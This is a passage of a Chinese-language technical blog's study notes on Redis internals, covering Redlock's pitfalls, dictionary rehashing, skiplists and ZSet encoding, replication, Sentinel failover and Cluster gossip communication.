<li><code>client1</code>从ABC三个节点处申请到锁，DE由于网络原因请求没有到达</li>
<li>C节点的时钟往前推了（或者C崩溃了）导致lock过期</li>
<li><code>client2</code>在CDE出获得了锁，AB由于网络原因请求未到达</li>
<li>此时<code>client1</code>和<code>client2</code>都获得了锁</li>
</ol>
<p>由于<strong>进程pause而不是时钟不可靠发生的问题</strong>：</p>
<ol>
<li><code>client1</code>从ABCDE处获得了锁</li>
<li>当获得锁的<code>response</code>还没到达<code>client1</code>时<code>client1</code>进入GC停顿</li>
<li>停顿期间锁已经过期了</li>
<li><code>client2</code>在ABCDE处获得了锁</li>
<li><code>client1</code>GC完成收到了锁的<code>response</code>，此时两个<code>client</code>又拿到了同一把锁</li>
</ol>
<p>这些例子说明了，仅有在假设了一个同步性系统模型的基础上，Redlock 才能正常工作，也就是系统能满足以下属性：</p>
<ul>
<li>网络延时边界，即假设数据包一定能在某个最大延时之内到达</li>
<li>进程停顿边界，即进程停顿一定在某个最大时间之内</li>
<li>时钟错误边界，即不会从一个坏的 NTP 服务器处取得时间</li>
</ul>
<blockquote>
<p>Redlock 不是一个好的选择，对于需求性能的分布式锁应用它太重了且成本高；对于需求正确性的应用来说它不够安全。因为它对高危的时钟或者说其他上述列举的情况进行了不可靠的假设，如果应用只需要高性能的分布式锁不要求多高的正确性，那么单节点 Redis 够了；如果应用想要保住正确性，那么不建议 Redlock，建议使用一个合适的一致性协调系统，例如<code>Zookeeper</code>，且保证存在<code>fencing token</code>。</p>
</blockquote>
<h1 id="19-Redis底层实现-用到了哪些数据结构"><a href="#19-Redis底层实现-用到了哪些数据结构" class="headerlink" title="19. Redis底层实现/用到了哪些数据结构"></a>19. Redis底层实现/用到了哪些数据结构</h1><h2 id="字典（也叫哈希）"><a href="#字典（也叫哈希）" class="headerlink" title="字典（也叫哈希）"></a>字典（也叫哈希）</h2><p>Redis 使用的是<code>key-value</code>的存储形式</p>
<p><code>dictht</code>是一个散列表结构，使用拉链法解决哈希冲突</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">typedef struct dictht &#123;</span><br><span class="line">    dictEntry **table;</span><br><span class="line">    unsigned long size;</span><br><span class="line">    unsigned long sizemask;</span><br><span class="line">    unsigned long used;</span><br><span class="line">&#125; dictht;</span><br><span class="line">typedef struct dictEntry &#123;</span><br><span class="line">    void *key;</span><br><span class="line">    union &#123;</span><br><span class="line">        void *val;</span><br><span class="line">        uint64_t u64;</span><br><span class="line">        ini64_t s64;</span><br><span class="line">        double d;</span><br><span class="line">    &#125; v;</span><br><span class="line">    struct dictEntry *next;</span><br><span class="line">&#125; dictEntry;</span><br></pre></td></tr></table></figure>

<p>Redis的字典<code>dict</code>中包含两个哈希表<code>dictht</code>,这是为了方便进行<code>rehash</code>操作。在扩容时，将其中一个<code>dictht</code>上的键值对<code>rehash</code>到另一个<code>dictht</code>上面，完成之后释放空间并交换两个<code>dictht</code>角色</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">typedef struct dict &#123;</span><br><span class="line">    dictType *type;</span><br><span class="line">    void *privdata;</span><br><span class="line">    dictht ht[2];</span><br><span class="line">    long rehashidx;</span><br><span class="line">    unsigned long iterators;</span><br><span class="line">&#125; dict;</span><br></pre></td></tr></table></figure>

<p><code>rehash</code>操作不是一次性完成的，而是采用渐进式，这是为了避免一次性执行过多的<code>rehash</code>操作给服务器造成过大的负担。</p>
<p>渐进式<code>rehash</code>通过记录<code>dict</code>的<code>rehashidx</code>完成，它从0开始，然后每执行一次<code>rehahsh</code>都会递增。例如在一次<code>rehash</code>中，要把<code>dict[0]</code> rehash 到 <code>dictht[1]</code>，这一次会把<code>dictht[0]</code>上<code>table[rehashidx]</code>的键值对<code>rehash</code>到<code>dictht[1]</code>上，<code>dictht[0]</code>的<code>table[rehashidx]</code>指向null，并令<code>rehashidx++</code>。</p>
<p>在<code>rehash</code>期间，每次对字典执行添加、删除、查找或者更新操作时，都会执行一次渐进式<code>rehash</code>。</p>
<p>采用渐进式<code>rehash</code>会导致字典中的数据分散在两个<code>dictht</code>上，因此对字典的查找操作也需要到对应的<code>dictht</code>去执行。</p>
<h2 id="跳跃表"><a href="#跳跃表" class="headerlink" title="跳跃表"></a>跳跃表</h2><p>是有序集合的底层实现之一。</p>
<p>与红黑树相比，跳跃表有以下优点：</p>
<ul>
<li>插入速度非常快速，因为不需要进行旋转等操作来维护平衡性</li>
<li>更容易实现</li>
<li>支持无锁操作</li>
</ul>
<h1 id="20-主从复制"><a href="#20-主从复制" class="headerlink" title="20. 主从复制"></a>20. 主从复制</h1><p>建立复制的方法有三种：</p>
<ol>
<li>在配置文件中加入<code>slaveof &#123;masterHost&#125; &#123;masterPort&#125;</code>,随Redis启动生效</li>
<li>在<code>redis-server</code>启动命令后加入<code>--slaveof &#123;masterHost&#125; &#123;masterPort&#125;</code>生效</li>
<li>直接使用命令：<code>slaveof &#123;masterHost&#125; &#123;masterPort&#125;</code>生效</li>
</ol>
<blockquote>
<p><strong>slaveof</strong>命令指定主节点，并将当前节点设置为从节点，建立成功后，从节点会复制主节点的数据。</p>
</blockquote>
<p>复制过程：</p>
<ol>
<li><p><strong>保存主节点信息</strong>：执行<code>slaveof</code>后从节点只保存主节点的地址信息便直接返回，还未建立复制的完整流程</p>
</li>
<li><p><strong>主从建立socket连接</strong>:从节点内部通过每秒运行的定时任务维护复制的相关逻辑，当定时任务发现存在新的主节点后，会尝试与该节点建立网络连接（通过建立socket套接字，接受主节点发送的复制命令）。如果从节点无法建立连接，定时任务会无限重试直到连接成功或者执行<code>slaveof no one</code></p>
</li>
<li><p><strong>发送<code>ping</code>命令</strong>:连接建立成功后，从节点发送ping命令请求首次通信，检测主从之间网络套接字是否可用，同时检测主节点当前是否可接受处理命令。如果发送<code>ping</code>命令后，从节点没有收到主节点的pong回复或者超时，比如网络超时或者主节点正在阻塞无法响应命令，从节点会断开复制连接，下次定时任务会发起重连</p>
</li>
<li><p><strong>权限验证</strong>：如果主节点设置了<code>requirepass</code>参数，则需要密码验证，从节点必须配置<code>masterauth</code>参数保证与主节点相同的密码才能通过验证；如果验证失败复制将终止，从节点重新发起复制流程。</p>
</li>
<li><p><strong>同步数据集</strong>:主从复制连接正常通信后，对于首次建立复制的场景，主节点会把持有的数据全部发送给从节点，这部分操作是耗时最长的步骤。Redis在2.8版本以后采用新复制命令<code>psync</code>进行数据同步，原来的<code>sync</code>命令依然支持，保证新旧版本的兼容性。新版同步划分两种情况：全量同步和部分同步。</p>
</li>
<li><p>命令持续复制</p>
<p>：当主节点把当前的数据同步给从节点后，便完成了复制的建立流程。接下来主节点会持续地把写命令发送给从节点，保证主从数据一致性。</p>
<blockquote>
<p>写命令的发送过程是异步完成，也就是说主节点自身处理完写命令后直接返回给客户端，并不等待从节点复制完成。这就会造成从节点的数据相对主节点存在延迟，具体延迟多少字节，可以通过在主节点执行<code>info replication</code>命令查看。</p>
</blockquote>
</li>
</ol>
<h2 id="主从复制下数据同步方法"><a href="#主从复制下数据同步方法" class="headerlink" title="主从复制下数据同步方法"></a>主从复制下数据同步方法</h2><p>2.8以后Redis使用 psync 命令完成主从数据复制，数据同步过程分为全量复制和部分复制</p>
<ul>
<li>全量复制：一般用于初次复制场景，Redis早期支持的复制功能只有全量复制，它会把主节点全部数据一次性发送给从节点，当数据量较大时，会对主从节点和网络造成很大的开销。</li>
<li>部分复制：用于处理在主从复制中因网络闪断等原因造成的数据丢失场景，当从节点再次连上主节点后，如果条件允许，主节点会补发丢失数据给从节点。因为补发的数据远远小于全量数据，可以有效避免全量复制的过高开销。<br>psync命令运行需要一下组件：</li>
</ul>
<ol>
<li>主从节点各自复制偏移量</li>
<li>主节点复制积压缓冲区</li>
<li>主节点运行id</li>
</ol>
<p>部分复制流程如下：</p>
<ol>
<li>当主从节点之间网络出现中断时，如果超过 repl-timeout 时间，主节点会认为从节点故障并中断复制连接。</li>
<li>主从连接中断期间主节点依然响应命令，但因复制连接中断命令无法发送给从节点，不过主节点内部存在的复制积压缓冲区，依然可以保存最近一段时间的写命令数据，默认最大缓存1MB。</li>
<li>当主从节点网络恢复后，从节点会再次连上主节点.</li>
<li>当主从连接恢复后，由于从节点之前保存了自身已复制的偏移量和主节点的运行ID。因此会把它们当作psync 参数发送给主节点，要求进行部分复制操作。</li>
<li>主节点接到 psync 命令后首先核对参数 runId 是否与自身一致，如果一致，说明之前复制的是当前主节点；之后根据参数 offset 在自身复制积压缓冲区查找，如果偏移量之后的数据存在缓冲区中，则对从节点发送 +CONTINUE 响应，表示可以进行部分复制。</li>
<li>主节点根据偏移量把复制积压缓冲区里的数据发送给从节点，保证主从复制进入正常状态。</li>
</ol>
<h1 id="21-Redis-哨兵模式"><a href="#21-Redis-哨兵模式" class="headerlink" title="21. Redis 哨兵模式"></a>21. Redis 哨兵模式</h1><p>Redis 哨兵（Sentinel）是Redis提供的一种高可用实现方案，Redis在主从复制下，一旦主节点出现问题，需要人工干预，手动将一个从节点更新为主节点（slaveof no one），同时还要通知应用方新的主节点，让其他从节点去复制新的从节点。这种方式存在弊端大，Redis Sentinel高可用方案就是为了解决这种问题。</p>
<p>Redis Sentinel 是一个分布式架构，其中包含若干个Sentinel节点和Redis数据节点，每个Sentinel节点会对数据节点和其余Sentinel节点进行监控，当它发现节点不可达时，会对节点做下线标识。如果被标识的是主节点，它还会和其他Sentinel节点进行“协商”，当大多数Sentinel节点都认为主节点不可达时，它们会选举出一个Sentinel节点来完成自动故障转移的工作，同时会将这个变化实时通知给Redis应用方。</p>
<h2 id="部署方式"><a href="#部署方式" class="headerlink" title="部署方式"></a>部署方式</h2><ul>
<li><p>首先部署主节点和从节点</p>
</li>
<li><p>部署sentinel节点<br>在Redis安装目录下有一个 sentinel.conf 的文件，是默认的 sentinel 节点配置文件，对其进行复制和修改</p>
</li>
<li><p>启动Sentinel节点</p>
<blockquote>
<p>Sentinel节点默认的端口是26379</p>
</blockquote>
</li>
</ul>
<p>启动节点的方式有两种：</p>
<ol>
<li>使用redis-sentinel命令</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">redis-sentinel sentinel配置文件.conf</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>使用redis-server命令加上</li>
</ol>
   <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">--sentinel</span><br></pre></td></tr></table></figure>



<p>   参数</p>
   <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">redis-server sentinel配置文件.conf —sentinel</span><br></pre></td></tr></table></figure>

<blockquote>
<p>每个sentinel节点会对主节点和所有从节点进行监控，同时Sentinel节点之间也会相互监控</p>
</blockquote>
<h2 id="实现原理"><a href="#实现原理" class="headerlink" title="实现原理"></a>实现原理</h2><h3 id="三个定时任务"><a href="#三个定时任务" class="headerlink" title="三个定时任务"></a>三个定时任务</h3><p>Redis Sentinel通过三个定时监控任务完成对每个节点发现和监控：</p>
<ol>
<li><p>每隔10秒，每个Sentinel节点会向主节点和从节点发送info命令获取最新的拓扑结构，Sentinel节点可以通过info replication的结果进行解析找到相应的从节点。</p>
<blockquote>
<p><strong>作用</strong>：通过向主节点执行 info 命令，获取从节点的信息，这也是为什么 Sentinel 节点不需要显式配置监控从节点<br>当有新的从节点加入时都可以立刻感知出来。<br>节点不可达或者故障转移后，可以通过 info 命令实时更新节点拓扑信息。</p>
</blockquote>
</li>
<li><p>每隔2秒，每个Sentinel会向Redis数据节点的</p>
</li>
</ol>
   <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">__sentinel__:hello</span><br></pre></td></tr></table></figure>



<p>   频道发送该 Sentinel 节点的信息，同时每个 Sentinel 节点也会订阅该频道，来了解其他 Sentinel 节点以及他们对主节点的判断</p>
<blockquote>
<p><strong>作用</strong>：发现新的Sentinel节点：通过订阅主节点的 <code>__sentinel__：hello</code> 了解其他的Sentinel节点信息，如果是新加入的 Sentinel 节点，将该 Sentinel 节点信息保存起来，并与该 Sentinel 节点创建连接<br>Sentinel 节点之间交换主节点的状态，作为后面客观下线以及领导者选举的依据。</p>
</blockquote>
<ol start="3">
<li><p>每隔1秒，每个Sentinel节点会向主节点、从节点、其余Sentinel节点发送一条ping命令做一次心跳检测，来确认这些节点当前是否可达。</p>
<blockquote>
<p><strong>作用</strong>：通过对上面的定时任务，Sentinel 节点对主节点、从节点，其余 Sentinel 节点都建立起连接，实现对每个节点的监控，这个定时任务是节点失败判定的重要依据。</p>
</blockquote>
</li>
</ol>
<h3 id="主观下线和客观下线"><a href="#主观下线和客观下线" class="headerlink" title="主观下线和客观下线"></a>主观下线和客观下线</h3><p>每个 Sentinel 节点每隔1秒对主节点、从节点、其他Sentinel节点发送ping命令做心脏检测，当这些节点超过 down-after-milliseconds 没有进行有效恢复时，Seintinel 节点会对该节点做失败判定，这个行为称为<strong>主观下线</strong>。</p>
<p>当 Sentinel 主观下线的节点是主节点时，该 Sentinel 节点会通过 <code>sentinel is-master-down-by-addr</code> 命令向其他 Sentinel 节点询问对主节点的判断。当超过 quorum 个数 Sentinel 节点认为主节点确实有问题，这时就会做出<strong>客观下线</strong>的决定</p>
<h3 id="领导者Sentinel节点的选取"><a href="#领导者Sentinel节点的选取" class="headerlink" title="领导者Sentinel节点的选取"></a>领导者Sentinel节点的选取</h3><ol>
<li>每个在线的Sentinel节点都有资格成为领导者，当它确认主节点主观下线时候，会向其他Sentinel节点发送 <code>sentinel is-master-down-by-addr</code> 命令， 要求将自己设置为领导者。</li>
<li>收到命令的Sentinel节点，如果没有同意过其他 Sentinel 节点的 <code>sentinel is-master-down-by-addr</code> 命令，将同意该请求，否则拒绝。</li>
<li>如果该 Sentinel 节点发现自己的票数已经大于等于 <code>max（quorum， num（sentinels）/2+1）</code>，那么它将成为领导者。</li>
<li>如果此过程没有选举出领导者，将进入下一次选举。</li>
</ol>
<blockquote>
<p>事实上每个Sectinel只有一票，会最先给发起请求的节点。基本上谁先完成客观下线，就会成为领导者</p>
</blockquote>
<h3 id="故障转移"><a href="#故障转移" class="headerlink" title="故障转移"></a>故障转移</h3><ol>
<li>在从节点列表中选出一个节点作为新的主节点，选择方法如下：</li>
</ol>
<ul>
<li>过滤：“不健康”（主观下线、断线）、5秒内没有回复过Sentinel节点ping响应、与主节点失联超过 <code>down-after-milliseconds*10</code> 秒。</li>
<li>选择slave-priority（从节点优先级）最高的从节点列表，如果存在则返回，不存在则继续。</li>
<li>选择复制偏移量最大的从节点（复制的最完整），如果存在则返回，不存在则继续。</li>
<li>选择runid最小的从节点。</li>
</ul>
<ol>
<li>Sentinel领导者节点会对第一步选出来的从节点执行slaveof no one命令让其成为主节点。</li>
<li>Sentinel领导者节点会向剩余的从节点发送命令，让它们成为新主节点的从节点，复制规则和parallel-syncs参数有关</li>
<li>Sentinel节点集合会将原来的主节点更新为从节点，并保持着对其关注，当其恢复后命令它去复制新的主节点。</li>
</ol>
<h1 id="22-Sorted-Set（即-ZSet-实现原理）"><a href="#22-Sorted-Set（即-ZSet-实现原理）" class="headerlink" title="22. Sorted Set（即 ZSet 实现原理）"></a>22. Sorted Set（即 ZSet 实现原理）</h1><p>ZSet 内部编码实现：</p>
<ul>
<li><code>ziplist</code>(压缩列表)：当哈希类型元素个数小于zset-max-ziplist-entries配置（默认128个），同时所有值小于zset-max-ziplist-value配置（默认64）时，使用ziplist作为内部实现，ziplist使用更加紧凑的结构实现多个元素的连续存储，在节省内存方面更加优秀。</li>
<li><code>skiplist</code>(跳表)：当ziplist条件不满足时，有序集合会使用skiplist作为内部实现，因为此时ziplist的读写效率会下降</li>
</ul>
<h2 id="ZipList"><a href="#ZipList" class="headerlink" title="ZipList"></a>ZipList</h2><p>ziplist 编码的 Zset 使用紧挨在一起的压缩列表节点来保存，第一个节点保存 member，第二个保存 score。ziplist 内的集合元素按 score 从小到大排序，其实质是一个双向链表。虽然元素是按 score 有序排序的， 但对 ziplist 的节点指针只能线性地移动，所以在 <code>REDIS_ENCODING_ZIPLIST</code> 编码的 Zset 中， 查找某个给定元素的复杂度为 O(N)。</p>
<p><img src="http://qiniu.xiaoming.net.cn/ziplist%E7%BB%93%E6%9E%84%E5%9B%BE.png" alt="ziplist结构图"></p>
<h2 id="Skiplist"><a href="#Skiplist" class="headerlink" title="Skiplist"></a>Skiplist</h2><p>skiplist 编码的 Zset 底层为一个被称为 zset 的结构体，这个结构体中<strong>包含一个字典和一个跳跃表</strong>。跳跃表按 score 从小到大保存所有集合元素，查找时间复杂度为平均 O(logN)，最坏 O(N) 。字典则保存着从 member 到 score 的映射，这样就可以用 O(1) 的复杂度来查找 member 对应的 score 值。虽然同时使用两种结构，但它们会通过指针来共享相同元素的 member 和 score，因此不会浪费额外的内存。</p>
   <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;* zset结构体 *&#x2F;</span><br><span class="line">typedef struct zset &#123;</span><br><span class="line">    &#x2F;&#x2F; 字典，维护元素值和分值的映射关系</span><br><span class="line">    dict *dict;</span><br><span class="line">    &#x2F;&#x2F; 按分值对元素值排序序，支持O(logN)数量级的查找操作</span><br><span class="line">    zskiplist *zsl;</span><br><span class="line">&#125; zset;</span><br></pre></td></tr></table></figure>

<p><img src="http://qiniu.xiaoming.net.cn/ZSet%E4%B8%ADskiplist%E7%BB%93%E6%9E%84.png" alt="ZSet中skiplist结构"></p>
<h3 id="跳表数据结构"><a href="#跳表数据结构" class="headerlink" title="跳表数据结构"></a>跳表数据结构</h3><p>跳表查找时间复杂度为平均 O(logN)，最差 O(N)，在大部分情况下效率可与平衡树相媲美，但实现比平衡树简单的多，跳表是一种典型的以空间换时间的数据结构。</p>
<p>跳表具有以下几个特点：</p>
<ul>
<li>由许多层结构组成。</li>
<li>每一层都是一个有序的链表。</li>
<li>最底层 (Level 1) 的链表包含所有元素。</li>
<li>如果一个元素出现在 Level i 的链表中，则它在 Level i 之下的链表也都会出现。</li>
<li>每个节点包含两个指针，一个指向同一链表中的下一个元素，一个指向下面一层的元素。</li>
</ul>
<p>跳表的查找会从顶层链表的头部元素开始，然后遍历该链表，直到找到元素大于或等于目标元素的节点，如果当前元素正好等于目标，那么就直接返回它。如果当前元素小于目标元素，那么就垂直下降到下一层继续搜索，如果当前元素大于目标或到达链表尾部，则移动到前一个节点的位置，然后垂直下降到下一层。正因为 Skiplist 的搜索过程会不断地从一层跳跃到下一层的，所以被称为跳跃表。</p>
<p><img src="https://camo.githubusercontent.com/11e7cbe718a70a81c42c37a13a257f91ef48dfd7/687474703a2f2f6d792d626c6f672d746f2d7573652e6f73732d636e2d6265696a696e672e616c6979756e63732e636f6d2f31382d31322d392f39333636363231372e6a7067" alt="跳跃表结构"></p>
<p><img src="http://qiniu.xiaoming.net.cn/%E8%B7%B3%E8%A1%A8%E7%BB%93%E6%9E%842.png" alt="跳表结构2"></p>
<p>跳表是一个“概率型”的数据结构，指的就是跳表在插入操作时，元素的插入层数完全是随机指定的。实际上该决定插入层数的随机函数对跳表的查找性能有着很大影响，这并不是一个普通的服从均匀分布的随机数，它的计算过程如下：</p>
<ol>
<li>指定一个节点最大的层数 MaxLevel，指定一个概率 p， 层数 lvl 默认为 1 。</li>
<li>生成一个 0~1 的随机数 r，若 r &lt; p，且 lvl &lt; MaxLevel ，则执行 lvl++。</li>
<li>重复第 2 步，直至生成的 r &gt; p 为止，此时的 lvl 就是要插入的层数。</li>
</ol>
<h3 id="Skiplist-与平衡树、哈希表的比较"><a href="#Skiplist-与平衡树、哈希表的比较" class="headerlink" title="Skiplist 与平衡树、哈希表的比较"></a>Skiplist 与平衡树、哈希表的比较</h3><ul>
<li>Skiplist 和各种平衡树（如AVL、红黑树等）的元素是有序排列的，而哈希表不是有序的。因此，在哈希表上只能做单个 key 的查找，不适宜做范围查找。</li>
<li>在做范围查找的时候，平衡树比 Skiplist 操作要复杂。在平衡树上，我们找到指定范围的小值之后，还需要以中序遍历的顺序继续寻找其它不超过大值的节点。如果不对平衡树进行一定的改造，这里的中序遍历并不容易实现。而在skiplist上进行范围查找就非常简单，只需要在找到小值之后，对第 1 层链表进行若干步的遍历就可以实现。</li>
<li>平衡树的插入和删除操作可能引发子树的调整，逻辑复杂，而 Skiplist 的插入和删除只需要修改相邻节点的指针，操作简单又快速。</li>
<li>从内存占用上来说，Skiplist 比平衡树更灵活一些。一般来说，平衡树每个节点包含 2 个指针（分别指向左右子树），而 Skiplist 每个节点包含的指针数目平均为1/(1−p)，具体取决于参数 p 的大小。如果像 Redis 里的实现一样，取 p=1/4，那么平均每个节点包含 1.33 个指针，比平衡树更有优势。</li>
<li>查找单个 key，Skiplist 和平衡树的时间复杂度都为 O(logN)；而哈希表在保持较低的哈希值冲突概率的前提下，查找时间复杂度接近 O(1)，性能更高一些。</li>
<li>从算法实现难度上来比较，Skiplist 比平衡树要简单得多。</li>
</ul>
<h3 id="Redis-中-Skiplist-的实现"><a href="#Redis-中-Skiplist-的实现" class="headerlink" title="Redis 中 Skiplist 的实现"></a>Redis 中 Skiplist 的实现</h3><p>在 Redis 的 skiplist 实现中，p=1/4 ，MaxLevel=32。</p>
<p>Redis中的 Skiplist 与经典 Skiplist 相比，有如下不同：</p>
<ul>
<li>分数(score)允许重复，即 Skiplist 的 key 允许重复，经典 Skiplist 中是不允许的。</li>
<li>在比较时，不仅比较分数（相当于 Skiplist 的 key），还比较数据本身。在 Redis 的 Skiplist 实现中，数据本身的内容唯一标识这份数据，而不是由 key 来唯一标识。另外，当多个元素分数相同的时候，还需要根据数据内容来进字典排序。</li>
<li>第 1 层链表不是一个单向链表，而是一个双向链表。这是为了方便以倒序方式获取一个范围内的元素。</li>
</ul>
<h3 id="Redis-Zset-采用跳表而不是平衡树的原因"><a href="#Redis-Zset-采用跳表而不是平衡树的原因" class="headerlink" title="Redis Zset 采用跳表而不是平衡树的原因"></a>Redis Zset 采用跳表而不是平衡树的原因</h3><ol>
<li>虽然是空间换时间，但也不是非常耗费内存，实际上取决于生成层数函数里的概率 p，取决得当的话其实和平衡树差不多。</li>
<li>因为有序集合经常会进行 ZRANGE 或 ZREVRANGE 这样的范围查找操作，跳表里面的双向链表可以十分方便地进行这类操作。</li>
<li>实现简单，ZRANK 操作还能达到 O(logN) 的时间复杂度。</li>
</ol>
<h1 id="23-Redis-为什么那么快？"><a href="#23-Redis-为什么那么快？" class="headerlink" title="23. Redis 为什么那么快？"></a>23. Redis 为什么那么快？</h1><p>Redis 快的原因主要有：</p>
<ul>
<li>纯内存操作：是将数据储存在内存里，结构类似于 HashMap，HashMap 的优势就是查找和操作的时间复杂度都是O(1)。它的绝大部分请求是纯粹的内存操作，内存响应大约100纳秒，所以他读写数据的时候都不会受到硬盘 I/O 速度的限制，所以速度极快。</li>
<li>单线程：采用单线程，保证了每个操作的原子性，也减少了线程的上下文切换和竞争，也不存在多进程或者多线程导致的切换而消耗 CPU，不用去考虑各种锁的问题，不存在加锁释放锁操作。</li>
<li>使用多路I/O复用模型，非阻塞IO。（这里“多路”指的是多个网络连接，“复用”指的是复用同一个线程。采用多路 I/O 复用技术可以让单个线程高效的处理多个连接请求，减少网络 IO 的时间消耗）</li>
<li>高效的数据结构：5种数据结构都有自己的应用场景</li>
<li>合理的数据编码：根据具体使用情况使用不一样的编码（字典渐进式Rehash，跳跃表）</li>
<li>其他方面的优化：定期删除+惰性删除等</li>
</ul>
<h1 id="24-Redis-集群原理"><a href="#24-Redis-集群原理" class="headerlink" title="24. Redis 集群原理"></a>24. Redis 集群原理</h1><h2 id="集群数据分区"><a href="#集群数据分区" class="headerlink" title="集群数据分区"></a>集群数据分区</h2><p>Redis Cluster 采用虚拟槽分区，所有的键根据哈希函数映射到 <code>0~16383</code> 整数槽内，计算公式：<code>slot=CRC16（key）&amp; 16383</code>。每一个节点负责维护一部分槽以及槽所映射的键值数据。</p>
<p><img src="https://qiniu.xiaoming.net.cn/redis%E9%9B%86%E7%BE%A4%E5%86%85%E8%8A%82%E7%82%B9%E9%80%9A%E4%BF%A1.png" alt="Redis数据分区"></p>
<p>Redis虚拟槽分区的特点：</p>
<ul>
<li>解耦数据和节点之间的关系，简化了节点扩容和收缩难度。</li>
<li>节点自身维护槽的映射关系，不需要客户端或者代理服务维护槽分区元数据。</li>
<li>支持节点、槽、键之间的映射查询，用于数据路由、在线伸缩等场景。</li>
</ul>
<p>可以使用 <code>redis-cli --cluster</code> 搭建集群</p>
<h2 id="节点通信"><a href="#节点通信" class="headerlink" title="节点通信"></a>节点通信</h2><p>通信流程：在分布式存储中需要提供维护节点元数据信息的机制，所谓元数据是指：节点负责哪些数据，是否出现故障等状态信息。常见的元数据维护方式分为：集中式和 P2P 方式。Redis集群采用 P2P 的 Gossip（流言）协议，Gossip 协议工作原理就是节点彼此不断通信交换信息，一段时间后所有的节点都会知道集群完整的信息。</p>
<p>通信过程：</p>
<ul>
<li>集群中的每个节点都会单独开辟一个 TCP 通道，用于节点之间彼此通信，通信端口号在基础端口上加10000。</li>
<li>每个节点在固定周期内通过特定规则选择几个节点发送 ping 消息。</li>
<li>接收到 ping 消息的节点用 pong 消息作为响应。</li>
</ul>
<h3 id="Gossip消息"><a href="#Gossip消息" class="headerlink" title="Gossip消息"></a>Gossip消息</h3><p>Gossip protocol 也叫 Epidemic Protocol （流行病协议），实际上它还有很多别名，比如：“流言算法”、“疫情传播算法”等。</p>
<p>Gossip 过程是由种子节点发起，当一个种子节点有状态需要更新到网络中的其他节点时，它会随机的选择周围几个节点散播消息，收到消息的节点也会重复该过程，直至最终网络中所有的节点都收到了消息。这个过程可能需要一定的时间，由于不能保证某个时刻所有节点都收到消息，但是理论上最终所有节点都会收到消息，因此它是一个最终一致性协议。</p>
<p>Gossip 协议的主要职责就是信息交换。信息交换的载体就是节点彼此发送的 Gossip 消息。常用的 Gossip消息可分为：ping 消息、pong 消息、meet 消息、fail 消息。</p>
<ul>
<li>meet 消息：用于通知新节点加入。消息发送者通知接收者加入到当前集群，meet 消息通信正常完成后，接收节点会加入到集群中并进行周期性的 ping、pong 消息交换。</li>
<li>ping 消息：集群内交换最频繁的消息，集群内每个节点每秒向多个其他节点发送 ping 消息，用于检测节点是否在线和交换彼此状态信息。ping 消息发送封装了自身节点和部分其他节点的状态数据。</li>
<li>pong 消息：当接收到 ping、meet 消息时，作为响应消息回复给发送方确认消息正常通信。pong 消息内部封装了自身状态数据。节点也可以向集群内广播自身的 pong 消息来通知整个集群对自身状态进行更新。</li>
<li>fail 消息：当节点判定集群内另一个节点下线时，会向集群内广播一个 fail 消息，其他节点接收到 fail 消息之后把对应节点更新为下线状态。</li>
</ul>
<p>所有的消息格式划分为：消息头和消息体。</p>
<h4 id="优势"><a href="#优势" class="headerlink" title="优势"></a>优势</h4><ul>
<li>扩展性：网络可以允许节点的任意增加和减少，新增加的节点的状态最终会与其他节点一致。</li>
<li>容错：网络中任何节点的宕机和重启都不会影响 Gossip 消息的传播，Gossip 协议具有天然的分布式系统容错特性。</li>
<li>去中心化：Gossip 协议不要求任何中心节点，所有节点都可以是对等的，任何一个节点无需知道整个网络状况，只要网络是连通的，任意一个节点就可以把消息散播到全网。</li>
<li>一致性收敛：Gossip 协议中的消息会以一传十、十传百一样的指数级速度在网络中快速传播，因此系统状态的不一致可以在很快的时间内收敛到一致。消息传播速度达到了 logN。</li>
<li>简单：Gossip 协议的过程极其简单，实现起来几乎没有太多复杂性。</li>
</ul>
<h4 id="Gossip-的缺陷"><a href="#Gossip-的缺陷" class="headerlink" title="Gossip 的缺陷"></a>Gossip 的缺陷</h4><p>分布式网络中，没有一种完美的解决方案，Gossip 协议跟其他协议一样，也有一些不可避免的缺陷，主要是两个：</p>
<ul>
<li>消息的延迟：</li>
</ul>
<p>由于 Gossip 协议中，节点只会随机向少数几个节点发送消息，消息最终是通过多个轮次的散播而到达全网的，因此使用 Gossip 协议会造成不可避免的消息延迟。不适合用在对实时性要求较高的场景下。</p>
<ul>
<li>消息冗余：</li>
</ul>
<p>Gossip 协议规定，节点会定期随机选择周围节点发送消息，而收到消息的节点也会重复该步骤，因此就不可避免的存在消息重复发送给同一节点的情况，造成了消息的冗余，同时也增加了收到消息的节点的处理压力。而且，由于是定期发送而且不反馈，因此，即使节点收到了消息，还是会反复收到重复消息，加重了消息的冗余。</p>
<h2 id="节点选择"><a href="#节点选择" class="headerlink" title="节点选择"></a>节点选择</h2><p>Redis集群内节点通信采用固定频率（定时任务每秒执行10次）。</p>
<p><img src="https://github.com/xiao-ming9/xiao-ming9.github.io/blob/master/images/redis%E9%9B%86%E7%BE%A4%E5%86%85%E8%8A%82%E7%82%B9%E9%80%9A%E4%BF%A1.png?raw=true" alt="Redis 集群节点选择"></p>
<p>由上图可以看出：消息交换的成本主要体现在单位时间选择发送消息的节点数量和每个消息携带的数据量</p>
<h3 id="选择发送消息的节点数量"><a href="#选择发送消息的节点数量" class="headerlink" title="选择发送消息的节点数量"></a>选择发送消息的节点数量</h3><p>集群内每个节点维护定时任务默认每秒执行10次，每秒会随机选取5个节点找出最久没有通信的节点发送ping消息，用于保证 Gossip 信息交换的随机性。每 100 毫秒都会扫描本地节点列表，如果发现节点最近一次接受 pong 消息的时间大于 <code>cluster_node_timeout/2</code>，则立刻发送 ping 消息，防止该节点信息太长时间未更新。根据以上规则得出每个节点每秒需要发送 ping 消息的数量 = <code>1+10*num（node.pong_received&gt;cluster_node_timeout/2)</code>。</p>
<h3 id="消息数据量"><a href="#消息数据量" class="headerlink" title="消息数据量"></a>消息数据量</h3><p>每个 ping 消息的数据量体现在消息头和消息体中，其中消息头主要占用空间的字段是 <code>myslots[CLUSTER_SLOTS/8]</code>，占用 2KB，这块空间占用相对固定。消息体会携带一定数量的其他节点信息用于信息交换。</p>
